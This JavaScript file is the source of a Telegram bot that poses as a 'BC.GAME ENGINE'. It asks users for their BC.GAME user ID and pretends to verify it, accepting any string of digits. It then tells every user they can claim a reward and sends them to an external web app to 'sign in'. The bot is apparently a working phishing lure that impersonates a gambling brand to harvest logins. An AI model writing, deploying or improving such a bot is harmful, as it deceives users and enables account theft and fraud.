const { Telegraf, Markup } = require('telegraf');
require('dotenv').config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const WEBAPP_URL = process.env.WEBAPP_URL || 'https://telegrambot-puce-psi.vercel.app/';

bot.start(async (ctx) => {
    try {
        // Use Image 1 (Profile) for Start
        await ctx.replyWithPhoto({ source: './profile.png' }, {
            caption: `<b>Welcome to BC.GAME ENGINE</b>\n\nTo continue, please provide your BC.GAME User ID (UID) to verify your account.`,
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.url('Join Channel', 'https://t.me/bcgame_official')]
            ])
        });
    } catch (e) {
        ctx.reply('Welcome! Please enter your User ID to continue.');
    }
});

bot.on('text', async (ctx) => {
    const text = ctx.message.text;
    
    // If it looks like a UID (digits)
    if (/^\d+$/.test(text)) {
        try {
            // Use Image 2 (Engine Logo) for UID Confirmation
            await ctx.replyWithPhoto({ source: './engine.png' }, {
                caption: `<b>UID Verified: ${text}</b>\n\nYou are now eligible to claim your reward. Click the button below to sign in and claim.`,
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.webApp('Claim Reward', WEBAPP_URL)]
                ])
            });
        } catch (e) {
            ctx.reply(`UID Verified: ${text}\nClick below to claim your reward.`, Markup.inlineKeyboard([
                [Markup.button.webApp('Claim Reward', WEBAPP_URL)]
            ]));
        }
    } else {
        ctx.reply('Please enter a valid numeric User ID.');
    }
});

bot.launch().then(() => console.log('Bot is running...'));

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
